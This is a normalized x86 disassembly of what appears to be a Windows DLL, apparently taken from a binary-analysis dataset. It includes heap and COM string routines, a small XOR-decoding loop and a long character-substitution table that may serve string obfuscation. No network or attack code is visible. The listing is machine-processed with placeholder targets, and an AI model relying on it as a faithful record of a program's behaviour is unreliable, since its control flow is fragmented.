lea ecx [ esi + 0xb4 ]
mov [ ebp - 0x4 ] 0x3
call sub_10036540
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov eax [ ebp - 0x30 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x30 ] eax
cmp eax ebx
jne r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_1006591f
add esp 0x4
mov ecx [ ebp - 0x30 ]
mov edx [ ecx ]
mov edx [ edx + 0x4 ]
xor eax eax
mov [ ebp - 0x2c ] ax
mov eax edx
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
lea edi [ eax + 0x2 ]
sub_10034170
push ebp
mov ebp esp
push 0xffffffff
push sub_10081ac0
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov esi [ ebp + 0x8 ]
cmp esi 0x1ffffff
jbe r-xdata
mov eax [ edi + 0x8 ]
sub eax [ edi ]
sar eax 0x7
cmp eax esi
jae r-xdata
push r--data
call sub_1002c5ed
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx esi
call sub_1002eae0
mov [ ebp - 0x4 ] 0x0
mov ebx [ ebp + 0x8 ]
mov edx [ edi + 0x4 ]
mov ecx [ edi ]
push ebx
push eax
push edx
mov [ ebp - 0x14 ] eax
call sub_1004d670
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
mov ebx ecx
add esp 0xc
sub ebx eax
mov [ ebp - 0x18 ] ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
shl esi 0x7
add esi eax
and ebx 0xffffff80
add ebx eax
mov [ edi + 0x8 ] esi
mov [ edi + 0x4 ] ebx
mov [ edi ] eax
mov esi eax
cmp esi ecx
je r-xdata
mov ecx [ edi ]
push ecx
call sub_1006591f
mov esi [ ebp + 0x8 ]
add esp 0x4
call sub_10054dd0
sub esi 0xffffff80
cmp esi [ ebp - 0x18 ]
jne r-xdata
sub_10034260
push ecx
push r--data
call sub_100534c0
add esp 0x4
mov [ rw-data ] eax
test eax eax
jne r-xdata
push 0xa
push eax
call [ WaitForSingleObject@IAT ]
xor ecx ecx
cmp eax 0x102
sete cl
mov eax ecx
pop ecx
retn
mov eax 0x1
pop ecx
retn
sub_10034295
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_1006a508
mov eax [ ebp + 0x8 ]
mov cl [ eax ]
mov esi [ ebp - 0x10 ]
test cl cl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
mov edx [ esi + 0xbc ]
mov edx [ edx ]
mov dl [ edx ]
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
jmp r-xdata
inc eax
mov cl [ eax ]
test cl cl
jne r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl dl
je r-xdata
cmp cl 0x65
je r-xdata
mov edx eax
cmp cl 0x45
je r-xdata
dec eax
cmp [ eax ] 0x30
je r-xdata
mov ecx [ esi + 0xbc ]
mov ecx [ ecx ]
push ebx
mov bl [ eax ]
cmp bl [ ecx ]
pop ebx
jne r-xdata
inc eax
mov cl [ edx ]
inc eax
inc edx
mov [ eax ] cl
test cl cl
jne r-xdata
dec eax
sub_10034317
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0xc ] eax
jbe r-xdata
pop ebp
retn
mov ecx [ ebp + 0x8 ]
inc eax
add ecx 0x2
cmp eax [ ebp + 0xc ]
jb r-xdata
cmp [ ecx ] 0x0
je r-xdata
sub_10034337
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ecx ]
mov ecx [ eax + 0x18 ]
and [ ebp - 0x4 ] 0x0
test ecx ecx
jne r-xdata
push ecx
mov ecx [ ebp + 0x8 ]
call sub_10001460
mov eax [ ebp + 0x8 ]
leave
retn 0x4
lea ecx [ eax + 0x1c ]
sub_10034360
push ebp
mov ebp esp
shr eax 0x1
mov ecx 0x0
je r-xdata
mov ecx 0x80070057
cmp eax 0x7fffffff
jbe r-xdata
mov eax ecx
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push esi
push edi
lea esi [ eax - 0x1 ]
lea eax [ ebp + 0xc ]
push eax
push ecx
push esi
push ebx
xor edi edi
call sub_100595ad
add esp 0x10
test eax eax
js r-xdata
test ecx ecx
js r-xdata
xor eax eax
mov [ ebx + esi * 2 ] ax
mov edi 0x8007007a
cmp eax esi
ja r-xdata
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn
xor edx edx
mov eax edi
pop edi
mov [ ebx + esi * 2 ] dx
pop esi
pop ebp
retn
sub_100343c0
push 0x58
mov eax sub_1007fce3
call sub_1001bb6b
movzx eax [ ebp + 0x18 ]
mov esi [ ebp + 0x14 ]
test [ esi + 0x14 ] 0x4000
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x54 ] eax
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
mov ecx esi
call sub_100688a0
xor ebx ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_1001fccb
pop ecx
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x58 ] eax
call sub_10069ce0
xor eax eax
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] ax
mov ecx [ ebp - 0x58 ]
xor edi edi
inc edi
lea eax [ ebp - 0x48 ]
mov [ ebp - 0x4 ] edi
push eax
cmp [ ebp + 0x1c ] bl
je r-xdata
movzx ebx [ ebp + 0x1c ]
mov edx [ ecx ]
push ebx
push eax
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call [ edx + 0x1c ]
mov eax edi
jmp r-xdata
call sub_10028071
mov [ ebp - 0x4 ] 0x3
call sub_1004ff82
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
call sub_1004fa89
retn 0x18
xor edi edi
jg r-xdata
push eax
lea ecx [ ebp - 0x2c ]
call sub_10003a04
push ebx
push edi
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_1000aecf
mov eax [ esi + 0x20 ]
cmp [ esi + 0x24 ] ebx
jl r-xdata
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
push edi
push [ ebp - 0x54 ]
lea eax [ ebp - 0x64 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x4c ]
call sub_100582fb
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x10 ] eax
xor edi edi
cmp eax [ ebp - 0x1c ]
jbe r-xdata
cmp eax ebx
jbe r-xdata
push [ ebp - 0x1c ]
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0x5c ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x4c ]
call sub_100224ec
mov ecx [ eax ]
push edi
push [ ebp - 0x54 ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
push eax
push ecx
push [ ebp - 0x50 ]
mov [ ebp + 0x10 ] eax
push [ ebp - 0x4c ]
mov [ esi + 0x20 ] ebx
mov [ esi + 0x24 ] ebx
call sub_100582fb
add esp 0x30
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1000aecf
mov eax [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
sub eax [ ebp - 0x1c ]
mov edi eax
jmp r-xdata
mov eax [ esi + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
sub_10034520
push ebp
mov ebp esp
sub esp 0x108
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx 0x3
mov [ ebp - 0x108 ] eax
xor eax eax
mov [ ebp - 0x14 ] cx
mov ecx [ r--data ]
push esi
mov [ ebp - 0xfc ] eax
mov [ ebp - 0x104 ] eax
lea ebx [ ebx ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x24
and edx 0xff
mov [ ebp + eax * 2 - 0x2c ] dx
inc eax
cmp eax 0x6
jb r-xdata
mov ecx [ ebx + 0x1c ]
xor eax eax
mov [ ebp - 0x20 ] ax
mov esi [ ecx ]
lea edx [ ebp - 0xfc ]
push edx
mov edx [ ebp - 0x14 ]
push r--data
lea eax [ ebp - 0x2c ]
push eax
sub esp 0x10
mov eax esp
mov [ eax ] edx
mov edx [ ebp - 0x10 ]
mov [ eax + 0x4 ] edx
mov edx 0x1
mov [ eax + 0x8 ] edx
mov edx [ ebp - 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ esi + 0xe0 ]
push ecx
call eax
test eax eax
mov eax [ ebp - 0xfc ]
jns r-xdata
lea edx [ ebp - 0xf0 ]
mov [ ebp - 0xf0 ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
test eax eax
jns r-xdata
test eax eax
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0x11a
call sub_100050e0
mov esi [ edi + 0x4 ]
mov ecx edx
push ecx
lea edx [ ebp - 0xf0 ]
push edx
push ebx
call sub_10022870
test eax eax
je r-xdata
lea edx [ ebp - 0xec ]
mov eax 0x120
jmp r-xdata
lea edx [ ebp - 0xec ]
mov eax 0x3a
call sub_100050e0
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x38 ]
mov eax 0x70
call sub_100050e0
mov esi [ edi + 0x8 ]
mov eax edx
push eax
lea ecx [ ebp - 0xf0 ]
push ecx
push ebx
call sub_10022870
test eax eax
je r-xdata
lea edx [ ebp - 0xb0 ]
mov eax 0xee
jmp r-xdata
call sub_100050e0
lea edx [ ebp - 0x4c ]
mov eax 0x10b
call sub_100050e0
mov esi [ edi + 0xc ]
push edx
lea eax [ ebp - 0xf0 ]
push eax
push ebx
call sub_10022870
test eax eax
je r-xdata
lea edx [ ebp - 0xac ]
mov eax 0x26
jmp r-xdata
mov eax [ ebp - 0xfc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0xf0 ] 0x0
lea edx [ ebp - 0x60 ]
mov eax 0x73
call sub_100050e0
mov esi [ edi + 0x1c ]
mov ecx edx
push ecx
lea edx [ ebp - 0xf0 ]
push edx
push ebx
call sub_10022870
test eax eax
je r-xdata
lea edx [ ebp - 0xb0 ]
mov eax 0x19
jmp r-xdata
mov ecx [ edi + 0x10 ]
lea eax [ ebp - 0x100 ]
push eax
push 0x0
push 0x80000000
push ecx
mov [ ebp - 0x100 ] 0x0
call [ VarBstrFromUI4@IAT ]
cmp [ ebp - 0x100 ] 0x0
jne r-xdata
lea edx [ ebp - 0xb4 ]
mov eax 0x52
jmp r-xdata
lea edx [ ebp - 0x74 ]
mov eax 0x4d
call sub_100050e0
mov esi [ ebp - 0x100 ]
push edx
lea eax [ ebp - 0xf0 ]
push eax
push ebx
call sub_10022870
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0x100 ] eax
mov edx [ edi + 0x14 ]
lea ecx [ ebp - 0xf8 ]
push ecx
push 0x0
push 0x80000000
push edx
mov [ ebp - 0xf8 ] 0x0
call [ VarBstrFromUI4@IAT ]
cmp [ ebp - 0xf8 ] 0x0
jne r-xdata
lea edx [ ebp - 0xb0 ]
mov eax 0xa2
call sub_100050e0
lea edx [ ebp - 0x14 ]
mov eax 0x74
call sub_100050e0
mov esi [ ebp - 0xf8 ]
mov eax edx
push eax
lea ecx [ ebp - 0xf0 ]
push ecx
push ebx
call sub_10022870
mov eax [ edi + 0x18 ]
lea edx [ ebp - 0xf4 ]
push edx
push 0x0
push 0x80000000
push eax
mov [ ebp - 0xf4 ] 0x0
call [ VarBstrFromUI4@IAT ]
cmp [ ebp - 0xf4 ] 0x0
jne r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0xf8 ] eax
lea edx [ ebp - 0xd8 ]
mov eax 0xa4
call sub_100050e0
mov esi [ ebp - 0xf4 ]
mov ecx edx
push ecx
lea edx [ ebp - 0xf0 ]
push edx
push ebx
call sub_10022870
mov eax [ ebp - 0x108 ]
mov eax [ eax ]
mov ecx [ eax ]
lea edx [ ebp - 0x104 ]
push edx
mov edx [ ebp - 0xfc ]
push edx
push eax
mov eax [ ecx + 0x54 ]
call eax
mov eax [ ebp - 0x104 ]
test eax eax
je r-xdata
push r--data
call [ SysAllocString@IAT ]
mov [ ebp - 0xf4 ] eax
lea edx [ ebp - 0xb8 ]
mov eax 0xff
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x104 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xf0 ]
test eax eax
je r-xdata
sub_100348b0
push ebp
mov ebp esp
push ecx
xor eax eax
mov [ esi + 0x10 ] eax
push 0xffffffff
push eax
mov [ ebp - 0x4 ] eax
mov [ esi + 0x14 ] 0xf
mov [ esi ] al
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
mov ecx esi
call sub_100417c0
mov eax esi
mov esp ebp
pop ebp
retn 0x4
sub_100348f0
push ebp
mov ebp esp
push 0xffffffff
push sub_100811f1
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0xc ]
mov edi ecx
xor ebx ebx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
jmp r-xdata
cmp edi [ ebp + 0x8 ]
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x1
cmp esi ebx
je r-xdata
add esi 0x3c
mov [ ebp - 0x4 ] bl
mov [ ebp + 0xc ] esi
add edi 0x3c
jmp r-xdata
mov eax [ edi ]
push 0xffffffff
lea ecx [ esi + 0x4 ]
mov [ esi ] eax
push ebx
lea edx [ edi + 0x4 ]
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] ebx
push edx
mov [ ecx ] bl
call sub_100417c0
mov eax [ edi + 0x20 ]
mov [ esi + 0x20 ] eax
mov ecx [ edi + 0x24 ]
mov [ esi + 0x24 ] ecx
mov edx [ edi + 0x28 ]
mov [ esi + 0x28 ] edx
mov eax [ edi + 0x2c ]
mov [ esi + 0x2c ] eax
mov ecx [ edi + 0x30 ]
mov [ esi + 0x30 ] ecx
mov edx [ edi + 0x34 ]
mov [ esi + 0x34 ] edx
mov al [ edi + 0x38 ]
mov [ esi + 0x38 ] al
sub_1003499b
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0xc ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_1000bd19
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_10027d70
add esi 0x3c
cmp esi edi
jne r-xdata
sub_100349d0
push ebp
mov ebp esp
push 0xffffffff
push sub_100806df
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x1c ]
mov edi [ GetProcessHeap@IAT ]
xor ebx ebx
push 0x4
mov [ esi ] ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x14 ] eax
push ebx
mov [ esi + 0x18 ] ebx
mov [ esi + 0x1c ] ebx
call edi
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
mov [ esi + 0x1c ] eax
inc [ eax ]
push 0x4
mov [ ebp - 0x4 ] ebx
push ebx
mov [ esi + 0x20 ] ebx
mov [ esi + 0x24 ] ebx
call edi
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
mov [ esi + 0x24 ] eax
inc [ eax ]
push 0x4
push ebx
mov [ esi + 0x28 ] ebx
mov [ esi + 0x2c ] ebx
call edi
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
mov [ esi + 0x2c ] eax
inc [ eax ]
push 0x4
lea edi [ esi + 0x30 ]
push ebx
mov [ edi ] ebx
mov [ edi + 0x4 ] ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] ebx
jmp r-xdata
mov [ edi + 0x4 ] eax
inc [ eax ]
push 0x4
push ebx
mov [ esi + 0x38 ] ebx
mov [ esi + 0x3c ] ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x4 ] 0x4
dec [ eax ]
jne r-xdata
mov edx [ edi + 0x4 ]
dec [ edx ]
cmp [ edx ] ebx
jne r-xdata
mov [ esi + 0x3c ] eax
inc [ eax ]
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
push ebx
push ecx
mov ecx [ ebp + 0x10 ]
push edx
call sub_1002a500
mov eax [ ebp + 0x20 ]
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
inc [ eax ]
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x5
cmp edi edx
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x1c
cmp ecx ebx
je r-xdata
mov [ edi ] ecx
mov [ edi + 0x4 ] eax
inc [ eax ]
mov edx [ edi ]
cmp edx ebx
je r-xdata
push eax
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov eax [ ebp - 0x14 ]
mov edx [ edi + 0x4 ]
cmp edx ebx
je r-xdata
mov eax [ edx ]
mov ecx edx
mov edx [ eax ]
push 0x1
call edx
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
push edx
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
sub_10034ba0
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xadb2ec
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x60
mov [ ebp - 0x4 ] 0x84b3ea
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x3c
mov [ ebp - 0x4 ] 0x81a0ec
call sub_10015630
mov [ eax ] 0x3e
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xbc9cec
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x21
mov [ ebp - 0x4 ] 0x9ca1eb
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x7e
mov [ ebp - 0x4 ] 0x9890eb
call sub_10015630
mov [ eax ] 0x23
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8092ed
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x7c
mov [ ebp - 0x4 ] 0xac97ec
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x5c
mov [ ebp - 0x4 ] 0x90a7eb
call sub_10015630
mov [ eax ] 0x3b
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb09aec
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x2a
mov [ ebp - 0x4 ] 0x848feb
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x5e
mov [ ebp - 0x4 ] 0xac82ec
call sub_10015630
mov [ eax ] 0x61
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xbcb3ea
call sub_10015630
lea ecx [ ebp - 0x4 ]
mov [ eax ] 0x62
mov [ ebp - 0x4 ] 0x98bdec
push ecx
mov ecx rw-data
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x63
mov [ ebp - 0x4 ] 0xb682ec
call sub_10015630
mov [ eax ] 0x64
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x88a7eb
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x65
mov [ ebp - 0x4 ] 0xb49aec
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x66
mov [ ebp - 0x4 ] 0xb88aed
call sub_10015630
mov [ eax ] 0x67
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x85b1ec
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x68
mov [ ebp - 0x4 ] 0xa498ec
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x69
mov [ ebp - 0x4 ] 0x8ca0eb
call sub_10015630
mov [ eax ] 0x6a
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x80a7ec
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x6b
mov [ ebp - 0x4 ] 0xb98beb
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x6c
mov [ ebp - 0x4 ] 0xbcb7ea
call sub_10015630
mov [ eax ] 0x6d
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x909eec
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x6e
mov [ ebp - 0x4 ] 0x998feb
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x6f
mov [ ebp - 0x4 ] 0xa8b0ec
call sub_10015630
mov [ eax ] 0x70
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8c9dec
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x71
mov [ ebp - 0x4 ] 0x9d8bec
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x72
mov [ ebp - 0x4 ] 0xbcaceb
call sub_10015630
mov [ eax ] 0x73
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb094eb
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x74
mov [ ebp - 0x4 ] 0x849cec
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x75
mov [ ebp - 0x4 ] 0xb082ec
call sub_10015630
mov [ eax ] 0x76
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xbb9ceb
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x77
mov [ ebp - 0x4 ] 0x9c95ed
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x78
mov [ ebp - 0x4 ] 0x81b6ea
call sub_10015630
mov [ eax ] 0x79
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x95a0ec
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x7a
mov [ ebp - 0x4 ] 0x989dec
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x31
mov [ ebp - 0x4 ] 0xa09cec
call sub_10015630
mov [ eax ] 0x32
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xa5a0eb
call sub_10015630
lea ecx [ ebp - 0x4 ]
mov [ eax ] 0x33
mov [ ebp - 0x4 ] 0xa493eb
push ecx
mov ecx rw-data
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x34
mov [ ebp - 0x4 ] 0x8495ec
call sub_10015630
mov [ eax ] 0x35
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb49dec
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x36
mov [ ebp - 0x4 ] 0xb496ec
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x37
mov [ ebp - 0x4 ] 0xb8a8eb
call sub_10015630
mov [ eax ] 0x38
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x888beb
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x39
mov [ ebp - 0x4 ] 0xbc9deb
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x30
mov [ ebp - 0x4 ] 0x948aeb
call sub_10015630
mov [ eax ] 0x3a
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x83b2ea
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x2f
mov [ ebp - 0x4 ] 0x849dec
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x2e
mov [ ebp - 0x4 ] 0x9c8bec
call sub_10015630
mov [ eax ] 0x3f
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb89dec
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x26
mov [ ebp - 0x4 ] 0x9895ed
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x2d
mov [ ebp - 0x4 ] 0xa48beb
call sub_10015630
mov [ eax ] 0x5f
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0xb0b8ea
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x3d
mov [ ebp - 0x4 ] 0xb781e3
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x60
mov [ ebp - 0x4 ] 0x8881e3
call sub_10015630
mov [ eax ] 0x3c
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8381e3
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x3e
mov [ ebp - 0x4 ] 0x8581e3
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x21
mov [ ebp - 0x4 ] 0x8681e3
call sub_10015630
mov [ eax ] 0x7e
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x8781e3
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x23
mov [ ebp - 0x4 ] 0x8981e3
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x7c
mov [ ebp - 0x4 ] 0x8e81e3
call sub_10015630
mov [ eax ] 0x5c
lea eax [ ebp - 0x4 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x9081e3
call sub_10015630
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx rw-data
mov [ eax ] 0x3b
mov [ ebp - 0x4 ] 0xba81e3
call sub_10015630
lea edx [ ebp - 0x4 ]
push edx
mov ecx rw-data
mov [ eax ] 0x2a
